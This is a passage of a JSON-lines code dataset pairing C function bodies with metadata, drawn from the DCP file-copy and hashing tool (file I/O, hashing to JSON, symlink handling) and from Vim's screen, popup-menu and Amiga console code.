{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int process_directory(file_t *newdir, const char *newpath, const char *oldpath,\n        const struct stat *oldst, const char *dapath, const void *pathmd5,\n        const struct process_opts *opts)", "code": "{\n    UNUSED(oldpath);\n    UNUSED(oldst);\n    UNUSED(dapath);\n    UNUSED(pathmd5);\n\n    if (fchownat(newdir->fd, newpath, opts->uid, opts->gid, 0) == -1)\n        log_warn(\"cannot chown '%s'\", pathstr(newdir, newpath));\n\n    return 0;\n}", "path": "src\\impl\\process_directory.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "inline ssize_t write_safe(int fd, const void *buf, size_t count)", "code": "{\n    ssize_t result;\n    for (;;)\n    {\n        if ((result = write(fd, buf, count)) < 0 && errno == EINTR)\n            continue;\n        else\n            return result;\n    }\n    return -2; /* unreachable code, but compiler knows best! */\n}", "path": "src\\fd.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl **************************************************************/\n", "func_signal": "int process_xattrs(const void *pathmd5, const char *filepath, FILE *out)", "code": "{\n    char keys[XATTR_LIST_MAX];\n    size_t keysbuffersize = XATTR_LIST_MAX;\n    uint8_t valuebuffer[XATTR_SIZE_MAX];\n    size_t valuebuffersize = XATTR_SIZE_MAX;\n    ssize_t bufsize, valuesize;\n    char *next, *end;\n\n    if (filepath == NULL)\n        return 0; /* Nothing to do */\n\n    if ((bufsize = llistxattr(filepath, keys, keysbuffersize)) == 0)\n        return 0;\n    else if (bufsize < 0)\n    {\n        /* xattrs not supported or disabled for this file, success */\n        if (errno == ENOTSUP)\n            return 0;\n        log_error(\"llistxattr\");\n        return -1;\n    }\n\n    end = keys + bufsize; /* pointer to the end of the list */\n\n    /* keys is one large string with '\\0' delimited names */\n    for (next = keys; next < end; next += (strlen(next) + 1))\n    {\n        memset(valuebuffer, 0, valuebuffersize);\n        valuesize = lgetxattr(filepath, next, valuebuffer, valuebuffersize);\n        if (valuesize < 0)\n            log_error(\"lgetxattr\");\n        else\n            io_entry_write_xattr_fields(pathmd5,next,valuebuffer,valuesize-1,out);\n    }\n\n    fflush(out);\n    return 0;\n}", "path": "src\\io_dcp_processor.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "inline void add_or_warn(index_t *idx, const void *pathmd5, const void *digest,\n        const char *file, ssize_t linenum)", "code": "{\n    if (index_lookup(idx, pathmd5, digest) == INDEX_SUCCESS)\n       log_warnx(\"skipping entry at '%s:%zd': already in index\", file,\n               linenum);\n    else\n        index_insert(idx, pathmd5, digest);\n}", "path": "src\\io\\io_index.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int io_dcp_processor(dcp_state_t state, const void *pathmd5,\n        const char *dapath, const struct stat *st, const char *accesspath,\n        const char *symlinkpath, const void *md5, const void *sha1,\n        const void *sha256, const void *sha512, unsigned long process_time,\n        void *context)", "code": "{\n    struct io_dcp_processor_ctx *ctx = context;\n    process_xattrs(pathmd5, accesspath, ctx->xattrout);\n\n    return io_entry_write_fields(dcp_strstate(state), dapath, st, pathmd5,\n            symlinkpath, md5, sha1, sha256, sha512, process_time, ctx->out);\n}", "path": "src\\io_dcp_processor.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* wrapper for read syscall eliminating the chance for EINTR errno */\n", "func_signal": "ssize_t fd_read(int fd, void *buf, size_t count)", "code": "{\n    ssize_t result;\n    for (;;)\n    {\n        if ((result = read(fd, buf, count)) < 0 && errno == EINTR)\n            continue;\n        else\n            return result;\n    }\n    return -2; /* unreachable code, but compiler knows best! */\n}", "path": "src\\fd.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/*\n * while jansson can be used for creating a json structure then printing it\n * out, there is a large overhead cost. Since we control the data only use\n * jansson to escape the strings we cannot control.\n */\n", "func_signal": "int io_entry_write_fields(const char *state, const char *path,\n        const struct stat *st, const void *pathmd5, const char *symlinkpath,\n        const void *md5, const void *sha1, const void *sha256,\n        const void *sha512, long elapsed, FILE *stream)", "code": "{\n    enum { MAX_LENGTH = PATH_MAX * 4 };\n\n    int ret;\n    size_t len;\n\n    /* use jansson for string character escaping of paths */\n    json_t *escaped;\n\n    /*\n     * used to hold hex strings for the hashes and the path if it contains\n     * non utf-8 characters\n     */\n    char buf[MAX_LENGTH];\n\n    ret = 0;\n\n    /* we are writing a json object on the line */\n    fputc('{', stream);\n\n    if (md5 != NULL)\n    {\n        unpack(buf, md5, MD5_DIGEST_LENGTH);\n        fprintf(stream, \"\\\"md5\\\":\\\"%s\\\",\", buf);\n    }\n\n    if (sha1 != NULL)\n    {\n        unpack(buf, sha1, SHA_DIGEST_LENGTH);\n        fprintf(stream, \"\\\"sha1\\\":\\\"%s\\\",\", buf);\n    }\n\n    if (sha256 != NULL)\n    {\n        unpack(buf, sha256, SHA256_DIGEST_LENGTH);\n        fprintf(stream, \"\\\"sha256\\\":\\\"%s\\\",\", buf);\n    }\n\n    if (sha512 != NULL)\n    {\n        unpack(buf, sha512, SHA512_DIGEST_LENGTH);\n        fprintf(stream, \"\\\"sha512\\\":\\\"%s\\\",\", buf);\n    }\n\n    /*\n     * up till this point we have been appending commas to the end of the\n     * entries, this is because we don't know which hashes are going to be\n     * provided. Now that pathmd5 has been put on the stream we switch to\n     * commas before any new entries, allowing errors to simply exit and not\n     * output malformed json.\n     */\n\n    unpack(buf, pathmd5, MD5_DIGEST_LENGTH);\n    fprintf(stream, \"\\\"pathmd5\\\":\\\"%s\\\"\", buf); /* no commas before or after */\n\n    if (st != NULL)\n    {\n        /* mode, size and timestamps */\n        fprintf(stream,\n                \",\\\"uid\\\":%u,\\\"gid\\\":%u,\"\n                \"\\\"mode\\\":%u,\\\"size\\\":%jd,\"\n                \"\\\"asec\\\":%ld,\\\"ansec\\\":%ld,\"\n                \"\\\"msec\\\":%ld,\\\"mnsec\\\":%ld,\"\n                \"\\\"csec\\\":%ld,\\\"cnsec\\\":%ld\",\n                st->st_uid, st->st_gid,\n                st->st_mode, (intmax_t) st->st_size,\n                st->st_atim.tv_sec, st->st_atim.tv_nsec,\n                st->st_mtim.tv_sec, st->st_mtim.tv_nsec,\n                st->st_ctim.tv_sec, st->st_ctim.tv_nsec);\n\n        /* extract what type of file from the mode */\n        fprintf(stream, \",\\\"type\\\":\\\"%s\\\"\",\n            S_ISREG(st->st_mode)?  \"reg\"  : S_ISDIR(st->st_mode)?  \"dir\"  :\n            S_ISLNK(st->st_mode)?  \"lnk\"  : S_ISCHR(st->st_mode)?  \"chr\"  :\n            S_ISBLK(st->st_mode)?  \"blk\"  : S_ISFIFO(st->st_mode)? \"fifo\" :\n            S_ISSOCK(st->st_mode)? \"sock\" : \"unkn\");\n    }\n\n    /* state string */\n    if ((escaped = json_string(state)) == NULL)\n    {\n        log_errorx(\"non valid utf-8 state string '%s'\", state);\n        ret = -1;\n        goto cleanup;\n    }\n    fputs(\",\\\"state\\\":\", stream);\n    json_dumpf(escaped, stream, JSON_ENCODE_ANY);\n    json_decref(escaped);\n\n    /* # of secs elapsed while processing */\n    if (elapsed > -1)\n        fprintf(stream, \",\\\"elapsed\\\":%ld\", elapsed);\n\n    /* if entry is a symlink we include what its target path was */\n\tif (symlinkpath != NULL)\n    {\n        /*\n         * symlinkTarget    valid utf-8 JSON escaped string where pointing\n         * symlinkTargetHex hex encoding of the target if jansson cannot encode\n         */\n        if ((escaped = json_string(symlinkpath)) != NULL)\n        {\n            fputs(\",\\\"symlinkTarget\\\":\", stream);\n            json_dumpf(escaped, stream, JSON_ENCODE_ANY);\n            json_decref(escaped);\n        }\n        else /* jansson was unable to handle the string */\n        {\n            len = strlen(symlinkpath);\n            if ((len * 2 + 1) > MAX_LENGTH)\n            {\n                log_errorx(\"buffer too small, expected string with length < %d,\"\n                        \" for non valid utf-8 string: '%s'\", MAX_LENGTH,\n                        symlinkpath);\n                ret = -1;\n                goto cleanup;\n            }\n            unpack(buf, symlinkpath, len);\n            fprintf(stream, \",\\\"symlinkTargetHex\\\":\\\"%s\\\"\", buf);\n        }\n    }\n\n    /*\n     * path     valid utf-8 JSON escaped path to the file\n     * pathHex  hex encoding of the path, provided if jansson cannot encode\n     */\n    if ((escaped = json_string(path)) != NULL)\n    {\n        fputs(\",\\\"path\\\":\", stream);\n        json_dumpf(escaped, stream, JSON_ENCODE_ANY);\n        json_decref(escaped);\n    }\n    else /* jansson was unable to handle the string */\n    {\n        len = strlen(path);\n        if ((len * 2 + 1) > MAX_LENGTH)\n        {\n            log_errorx(\"buffer too small, expected string with length < %d, \"\n                    \"for non valid utf-8 path string: '%s'\", MAX_LENGTH, path);\n            ret = -1;\n            goto cleanup;\n        }\n        unpack(buf, path, len);\n        fprintf(stream, \",\\\"pathhex\\\":\\\"%s\\\"\", buf);\n    }\n\n\ncleanup:\n    /* print a newline our record separator */\n    fputs(\"}\\n\", stream);\n    return ret;\n}", "path": "src\\io\\io_entry.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "size_t parse_cache_size(const struct cmdline_info *info)", "code": "{\n    size_t size;\n    const char *val;\n    char *end;\n\n    size = 32768; /* default if not specified */\n\n    val = getenv(ENV_CACHE_SIZE);\n    if (info->cache_size_given)\n        val = info->cache_size_arg;\n\n    if (val == NULL)\n        return size;\n\n    size = strtol(val, &end, 0);\n    if (val == end)\n        log_critx(EXIT_FAILURE, \"invalid cache size: '%s'\", val);\n\n    switch (*end)\n    {\n    case '\\0':                                              break;\n    case 'k':  case 'K':    size *= 1024;                   break;\n    case 'm':  case 'M':    size *= (1024 * 1024);          break;\n    case 'g':  case 'G':    size *= (1024 * 1024 * 1024);   break;\n    default:\n        log_critx(EXIT_FAILURE, \"invalid cache suffix: '%s'\", val);\n    }\n\n    return size;\n}", "path": "src\\main.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int fd_pipe(int outfd, int infd, void *buffer, size_t blen)", "code": "{\n    void *buf;\n    ssize_t r;\n\n    enum { BUFSIZE = 32768 };\n\n    if (buffer == NULL)\n    {\n        if ((buf = malloc(BUFSIZE)) == NULL)\n        {\n            log_debug(\"malloc\");\n            return -1;\n        }\n        blen = BUFSIZE;\n    }\n\n    else\n        buf = buffer;\n\n    while ((r = fd_read(infd, buf, blen)) > 0)\n    {\n        if ((r = fd_write_full(outfd, buf, r)) == -1)\n        {\n            log_debug(\"fd_write\");\n            if (buffer == NULL)\n                free(buf);\n            return -1;\n        }\n    }\n\n    if (r == -1)\n    {\n        log_debug(\"read_safe\");\n        if (buffer == NULL)\n            free(buf);\n        return -1;\n    }\n\n    if (buffer == NULL)\n        free(buf);\n\n    return 0;\n}", "path": "src\\fd.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "inline void escaping_fputs(const char *s, FILE *out)", "code": "{\n    size_t len;\n    size_t i;\n    char c;\n    for (i = 0, len = strlen(s); i < len; i++)\n    {\n        c = s[i];\n        switch (c)\n        {\n        case '\\n':  fputs(\"\\\\n\", out);  break;\n        case '\\t':  fputs(\"\\\\t\", out);  break;\n        default:    fputc(c, out);\n        }\n    }\n}", "path": "src\\io\\io_metadata.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int process_symlink(file_t *newdir, const char *newpath, const char *oldpath,\n        const struct stat *oldst, const char *dapath, const void *pathmd5,\n        const struct process_opts *opts)", "code": "{\n    int r;\n    void *buf;\n    size_t bufsize;\n    dcp_state_t state;\n\n    /* ensure the buffer is large enough */\n    if (oldst->st_size < (off_t) (opts->buffer_size + 1))\n    {\n        bufsize = oldst->st_size + 1; /* include room for the null byte */\n        buf = calloc(sizeof(char), bufsize);\n    }\n    else\n    {\n        buf = opts->buffer;\n        bufsize = opts->buffer_size;\n    }\n\n    state = DCP_SYMLINK_CREATED;\n    if ((r = readlink(oldpath, buf, bufsize)) == -1)\n    {\n        state = DCP_FAILED;\n        log_error(\"cannot read symlink '%s'\", oldpath);\n    }\n    else\n    {\n        /* create the symlink, unlinking an existing file if it exists */\n        while ((r = symlinkat(buf, newdir->fd, newpath)) == -1)\n        {\n            if (errno == EEXIST)\n            {\n                if ((r = unlinkat(newdir->fd, newpath, 0)) == -1)\n                {\n                    state = DCP_FAILED;\n                    log_error(\"cannot unlink '%s'\", pathstr(newdir, newpath));\n                    break;\n                }\n            }\n            else\n            {\n                state = DCP_FAILED;\n                log_error(\"cannot create symlink '%s'\",\n                        pathstr(newdir, newpath));\n                break;\n            }\n        }\n    }\n    opts->callback(state, pathmd5, dapath, oldst, oldpath, buf, NULL, NULL, NULL, NULL, -1,\n            opts->callback_ctx);\n\n    /* if we allocated a new buffer free it */\n    if (buf != opts->buffer)\n        free(buf);\n\n    return r;\n}", "path": "src\\impl\\process_symlink.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/*\n * Check if the cursor line needs to be redrawn because of 'concealcursor'.\n */\n", "func_signal": "void\nconceal_check_cursur_line()", "code": "{\n    if (curwin->w_p_cole > 0 && conceal_cursor_line(curwin))\n    {\n\tneed_cursor_line_redraw = TRUE;\n\t/* Need to recompute cursor column, e.g., when starting Visual mode\n\t * without concealing. */\n\tcurs_columns(TRUE);\n    }\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Reset the colors for a cterm.  Used when leaving Vim.\n * The machine specific code may override this again.\n */\n", "func_signal": "void\nreset_cterm_colors()", "code": "{\n    if (t_colors > 1)\n    {\n\t/* set Normal cterm colors */\n\tif (cterm_normal_fg_color > 0 || cterm_normal_bg_color > 0)\n\t{\n\t    out_str(T_OP);\n\t    screen_attr = -1;\n\t}\n\tif (cterm_normal_fg_bold)\n\t{\n\t    out_str(T_ME);\n\t    screen_attr = -1;\n\t}\n    }\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Return TRUE if redrawing should currently be done.\n */\n", "func_signal": "int\nredrawing()", "code": "{\n    return (!RedrawingDisabled\n\t\t       && !(p_lz && char_avail() && !KeyTyped && !do_redraw));\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * try to get the real window size\n * return FAIL for failure, OK otherwise\n */\n", "func_signal": "int\nmch_get_shellsize()", "code": "{\n    struct ConUnit  *conUnit;\n#ifndef __amigaos4__\n    char\t    id_a[sizeof(struct InfoData) + 3];\n#endif\n    struct InfoData *id=0;\n\n    if (!term_console)\t/* not an amiga window */\n\tgoto out;\n\n    /* insure longword alignment */\n#ifdef __amigaos4__\n    if (!(id = AllocDosObject(DOS_INFODATA, 0)))\n\tgoto out;\n#else\n    id = (struct InfoData *)(((long)id_a + 3L) & ~3L);\n#endif\n\n    /*\n     * Should make console aware of real window size, not the one we set.\n     * Unfortunately, under DOS 2.0x this redraws the window and it\n     * is rarely needed, so we skip it now, unless we changed the size.\n     */\n    if (size_set)\n\tOUT_STR(\"\\233t\\233u\");\t/* CSI t CSI u */\n    out_flush();\n\n#ifdef __AROS__\n    if (!Info(raw_out, id)\n\t\t || (wb_window = (struct Window *) id->id_VolumeNode) == NULL)\n#else\n    if (dos_packet(MP(raw_out), (long)ACTION_DISK_INFO, ((ULONG) id) >> 2) == 0\n\t    || (wb_window = (struct Window *)id->id_VolumeNode) == NULL)\n#endif\n    {\n\t/* it's not an amiga window, maybe aux device */\n\t/* terminal type should be set */\n\tterm_console = FALSE;\n\tgoto out;\n    }\n    if (oldwindowtitle == NULL)\n\toldwindowtitle = (char_u *)wb_window->Title;\n    if (id->id_InUse == (BPTR)NULL)\n    {\n\tmch_errmsg(_(\"mch_get_shellsize: not a console??\\n\"));\n\treturn FAIL;\n    }\n    conUnit = (struct ConUnit *) ((struct IOStdReq *) id->id_InUse)->io_Unit;\n\n    /* get window size */\n    Rows = conUnit->cu_YMax + 1;\n    Columns = conUnit->cu_XMax + 1;\n    if (Rows < 0 || Rows > 200)\t    /* cannot be an amiga window */\n    {\n\tColumns = 80;\n\tRows = 24;\n\tterm_console = FALSE;\n\treturn FAIL;\n    }\n\n    return OK;\nout:\n#ifdef __amigaos4__\n    FreeDosObject(DOS_INFODATA, id); /* Safe to pass NULL */\n#endif\n\n    return FAIL;\n}", "path": "src\\os_amiga.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Finish updating one or more windows.\n */\n", "func_signal": "static void\nupdate_finish()", "code": "{\n    if (redraw_cmdline)\n\tshowmode();\n\n# ifdef FEAT_SEARCH_EXTRA\n    end_search_hl();\n# endif\n\n    updating_screen = FALSE;\n\n# ifdef FEAT_GUI\n    gui_may_resize_shell();\n\n    /* Redraw the cursor and update the scrollbars when all screen updating is\n     * done. */\n    if (gui.in_use)\n    {\n\tout_flush();\t/* required before updating the cursor */\n\tgui_update_cursor(FALSE, FALSE);\n\tgui_update_scrollbars(FALSE);\n    }\n# endif\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Clean up for 'hlsearch' highlighting.\n */\n", "func_signal": "static void\nend_search_hl()", "code": "{\n    if (search_hl.rm.regprog != NULL)\n    {\n\tvim_regfree(search_hl.rm.regprog);\n\tsearch_hl.rm.regprog = NULL;\n    }\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * mark all status lines for redraw; used after first :cd\n */\n", "func_signal": "void\nstatus_redraw_all()", "code": "{\n    win_T\t*wp;\n\n    for (wp = firstwin; wp; wp = wp->w_next)\n\tif (wp->w_status_height)\n\t{\n\t    wp->w_redr_status = TRUE;\n\t    redraw_later(VALID);\n\t}\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Try to set the real window size to Rows and Columns.\n */\n", "func_signal": "void\nmch_set_shellsize()", "code": "{\n    if (term_console)\n    {\n\tsize_set = TRUE;\n\tout_char(CSI);\n\tout_num((long)Rows);\n\tout_char('t');\n\tout_char(CSI);\n\tout_num((long)Columns);\n\tout_char('u');\n\tout_flush();\n    }\n}", "path": "src\\os_amiga.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Prepare for updating one or more windows.\n * Caller must check for \"updating_screen\" already set to avoid recursiveness.\n */\n", "func_signal": "static void\nupdate_prepare()", "code": "{\n    cursor_off();\n    updating_screen = TRUE;\n#ifdef FEAT_GUI\n    /* Remove the cursor before starting to do anything, because scrolling may\n     * make it difficult to redraw the text under it. */\n    if (gui.in_use)\n\tgui_undraw_cursor();\n#endif\n#ifdef FEAT_SEARCH_EXTRA\n    start_search_hl();\n#endif\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Position for a mode message.\n */\n", "func_signal": "static void\nmsg_pos_mode()", "code": "{\n    msg_col = 0;\n    msg_row = Rows - 1;\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * mark all status lines of the current buffer for redraw\n */\n", "func_signal": "void\nstatus_redraw_curbuf()", "code": "{\n    win_T\t*wp;\n\n    for (wp = firstwin; wp; wp = wp->w_next)\n\tif (wp->w_status_height != 0 && wp->w_buffer == curbuf)\n\t{\n\t    wp->w_redr_status = TRUE;\n\t    redraw_later(VALID);\n\t}\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Prepare for 'hlsearch' highlighting.\n */\n", "func_signal": "static void\nstart_search_hl()", "code": "{\n    if (p_hls && !no_hlsearch)\n    {\n\tlast_pat_prog(&search_hl.rm);\n\tsearch_hl.attr = hl_attr(HLF_L);\n# ifdef FEAT_RELTIME\n\t/* Set the time limit to 'redrawtime'. */\n\tprofile_setlimit(p_rdt, &search_hl.tm);\n# endif\n    }\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Redraw the popup menu, using \"pum_first\" and \"pum_selected\".\n */\n", "func_signal": "void\npum_redraw()", "code": "{\n    int\t\trow = pum_row;\n    int\t\tcol;\n    int\t\tattr_norm = highlight_attr[HLF_PNI];\n    int\t\tattr_select = highlight_attr[HLF_PSI];\n    int\t\tattr_scroll = highlight_attr[HLF_PSB];\n    int\t\tattr_thumb = highlight_attr[HLF_PST];\n    int\t\tattr;\n    int\t\ti;\n    int\t\tidx;\n    char_u\t*s;\n    char_u\t*p = NULL;\n    int\t\ttotwidth, width, w;\n    int\t\tthumb_pos = 0;\n    int\t\tthumb_heigth = 1;\n    int\t\tround;\n    int\t\tn;\n\n    /* Never display more than we have */\n    if (pum_first > pum_size - pum_height)\n\tpum_first = pum_size - pum_height;\n\n    if (pum_scrollbar)\n    {\n\tthumb_heigth = pum_height * pum_height / pum_size;\n\tif (thumb_heigth == 0)\n\t    thumb_heigth = 1;\n\tthumb_pos = (pum_first * (pum_height - thumb_heigth)\n\t\t\t    + (pum_size - pum_height) / 2)\n\t\t\t\t\t\t    / (pum_size - pum_height);\n    }\n\n    for (i = 0; i < pum_height; ++i)\n    {\n\tidx = i + pum_first;\n\tattr = (idx == pum_selected) ? attr_select : attr_norm;\n\n\t/* prepend a space if there is room */\n#ifdef FEAT_RIGHTLEFT\n\tif (curwin->w_p_rl)\n\t{\n\t    if (pum_col < W_WINCOL(curwin) + W_WIDTH(curwin) - 1)\n\t\tscreen_putchar(' ', row, pum_col + 1, attr);\n\t}\n\telse\n#endif\n\t    if (pum_col > 0)\n\t\tscreen_putchar(' ', row, pum_col - 1, attr);\n\n\t/* Display each entry, use two spaces for a Tab.\n\t * Do this 3 times: For the main text, kind and extra info */\n\tcol = pum_col;\n\ttotwidth = 0;\n\tfor (round = 1; round <= 3; ++round)\n\t{\n\t    width = 0;\n\t    s = NULL;\n\t    switch (round)\n\t    {\n\t\tcase 1: p = pum_array[idx].pum_text; break;\n\t\tcase 2: p = pum_array[idx].pum_kind; break;\n\t\tcase 3: p = pum_array[idx].pum_extra; break;\n\t    }\n\t    if (p != NULL)\n\t\tfor ( ; ; mb_ptr_adv(p))\n\t\t{\n\t\t    if (s == NULL)\n\t\t\ts = p;\n\t\t    w = ptr2cells(p);\n\t\t    if (*p == NUL || *p == TAB || totwidth + w > pum_width)\n\t\t    {\n\t\t\t/* Display the text that fits or comes before a Tab.\n\t\t\t * First convert it to printable characters. */\n\t\t\tchar_u\t*st;\n\t\t\tint\tsaved = *p;\n\n\t\t\t*p = NUL;\n\t\t\tst = transstr(s);\n\t\t\t*p = saved;\n#ifdef FEAT_RIGHTLEFT\n\t\t\tif (curwin->w_p_rl)\n\t\t\t{\n\t\t\t    if (st != NULL)\n\t\t\t    {\n\t\t\t\tchar_u\t*rt = reverse_text(st);\n\n\t\t\t\tif (rt != NULL)\n\t\t\t\t{\n\t\t\t\t    char_u\t*rt_start = rt;\n\t\t\t\t    int\t\tsize;\n\n\t\t\t\t    size = vim_strsize(rt);\n\t\t\t\t    if (size > pum_width)\n\t\t\t\t    {\n\t\t\t\t\tdo\n\t\t\t\t\t{\n\t\t\t\t\t    size -= has_mbyte\n\t\t\t\t\t\t    ? (*mb_ptr2cells)(rt) : 1;\n\t\t\t\t\t    mb_ptr_adv(rt);\n\t\t\t\t\t} while (size > pum_width);\n\n\t\t\t\t\tif (size < pum_width)\n\t\t\t\t\t{\n\t\t\t\t\t    /* Most left character requires\n\t\t\t\t\t     * 2-cells but only 1 cell is\n\t\t\t\t\t     * available on screen.  Put a\n\t\t\t\t\t     * '<' on the left of the pum\n\t\t\t\t\t     * item */\n\t\t\t\t\t    *(--rt) = '<';\n\t\t\t\t\t    size++;\n\t\t\t\t\t}\n\t\t\t\t    }\n\t\t\t\t    screen_puts_len(rt, (int)STRLEN(rt),\n\t\t\t\t\t\t   row, col - size + 1, attr);\n\t\t\t\t    vim_free(rt_start);\n\t\t\t\t}\n\t\t\t\tvim_free(st);\n\t\t\t    }\n\t\t\t    col -= width;\n\t\t\t}\n\t\t\telse\n#endif\n\t\t\t{\n\t\t\t    if (st != NULL)\n\t\t\t    {\n\t\t\t\tscreen_puts_len(st, (int)STRLEN(st), row, col,\n\t\t\t\t\t\t\t\t\tattr);\n\t\t\t\tvim_free(st);\n\t\t\t    }\n\t\t\t    col += width;\n\t\t\t}\n\n\t\t\tif (*p != TAB)\n\t\t\t    break;\n\n\t\t\t/* Display two spaces for a Tab. */\n#ifdef FEAT_RIGHTLEFT\n\t\t\tif (curwin->w_p_rl)\n\t\t\t{\n\t\t\t    screen_puts_len((char_u *)\"  \", 2, row, col - 1,\n\t\t\t\t\t\t\t\t\tattr);\n\t\t\t    col -= 2;\n\t\t\t}\n\t\t\telse\n#endif\n\t\t\t{\n\t\t\t    screen_puts_len((char_u *)\"  \", 2, row, col, attr);\n\t\t\t    col += 2;\n\t\t\t}\n\t\t\ttotwidth += 2;\n\t\t\ts = NULL;\t    /* start text at next char */\n\t\t\twidth = 0;\n\t\t    }\n\t\t    else\n\t\t\twidth += w;\n\t\t}\n\n\t    if (round > 1)\n\t\tn = pum_kind_width + 1;\n\t    else\n\t\tn = 1;\n\n\t    /* Stop when there is nothing more to display. */\n\t    if (round == 3\n\t\t    || (round == 2 && pum_array[idx].pum_extra == NULL)\n\t\t    || (round == 1 && pum_array[idx].pum_kind == NULL\n\t\t\t\t\t  && pum_array[idx].pum_extra == NULL)\n\t\t    || pum_base_width + n >= pum_width)\n\t\tbreak;\n#ifdef FEAT_RIGHTLEFT\n\t    if (curwin->w_p_rl)\n\t    {\n\t\tscreen_fill(row, row + 1, pum_col - pum_base_width - n + 1,\n\t\t\t\t\t\t    col + 1, ' ', ' ', attr);\n\t\tcol = pum_col - pum_base_width - n + 1;\n\t    }\n\t    else\n#endif\n\t    {\n\t\tscreen_fill(row, row + 1, col, pum_col + pum_base_width + n,\n\t\t\t\t\t\t\t      ' ', ' ', attr);\n\t\tcol = pum_col + pum_base_width + n;\n\t    }\n\t    totwidth = pum_base_width + n;\n\t}\n\n#ifdef FEAT_RIGHTLEFT\n\tif (curwin->w_p_rl)\n\t    screen_fill(row, row + 1, pum_col - pum_width + 1, col + 1, ' ',\n\t\t\t\t\t\t\t\t    ' ', attr);\n\telse\n#endif\n\t    screen_fill(row, row + 1, col, pum_col + pum_width, ' ', ' ',\n\t\t\t\t\t\t\t\t\tattr);\n\tif (pum_scrollbar > 0)\n\t{\n#ifdef FEAT_RIGHTLEFT\n\t    if (curwin->w_p_rl)\n\t\tscreen_putchar(' ', row, pum_col - pum_width,\n\t\t\ti >= thumb_pos && i < thumb_pos + thumb_heigth\n\t\t\t\t\t\t  ? attr_thumb : attr_scroll);\n\t    else\n#endif\n\t\tscreen_putchar(' ', row, pum_col + pum_width,\n\t\t\ti >= thumb_pos && i < thumb_pos + thumb_heigth\n\t\t\t\t\t\t  ? attr_thumb : attr_scroll);\n\t}\n\n\t++row;\n    }\n}", "path": "src\\popupmnu.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Draw the tab pages line at the top of the Vim window.\n */\n", "func_signal": "static void\ndraw_tabline()", "code": "{\n    int\t\ttabcount = 0;\n    tabpage_T\t*tp;\n    int\t\ttabwidth;\n    int\t\tcol = 0;\n    int\t\tscol = 0;\n    int\t\tattr;\n    win_T\t*wp;\n    win_T\t*cwp;\n    int\t\twincount;\n    int\t\tmodified;\n    int\t\tc;\n    int\t\tlen;\n    int\t\tattr_sel = hl_attr(HLF_TPS);\n    int\t\tattr_nosel = hl_attr(HLF_TP);\n    int\t\tattr_fill = hl_attr(HLF_TPF);\n    char_u\t*p;\n    int\t\troom;\n    int\t\tuse_sep_chars = (t_colors < 8\n#ifdef FEAT_GUI\n\t\t\t\t\t    && !gui.in_use\n#endif\n\t\t\t\t\t    );\n\n    redraw_tabline = FALSE;\n\n#ifdef FEAT_GUI_TABLINE\n    /* Take care of a GUI tabline. */\n    if (gui_use_tabline())\n    {\n\tgui_update_tabline();\n\treturn;\n    }\n#endif\n\n    if (tabline_height() < 1)\n\treturn;\n\n#if defined(FEAT_STL_OPT)\n\n    /* Init TabPageIdxs[] to zero: Clicking outside of tabs has no effect. */\n    for (scol = 0; scol < Columns; ++scol)\n\tTabPageIdxs[scol] = 0;\n\n    /* Use the 'tabline' option if it's set. */\n    if (*p_tal != NUL)\n    {\n\tint\tsave_called_emsg = called_emsg;\n\n\t/* Check for an error.  If there is one we would loop in redrawing the\n\t * screen.  Avoid that by making 'tabline' empty. */\n\tcalled_emsg = 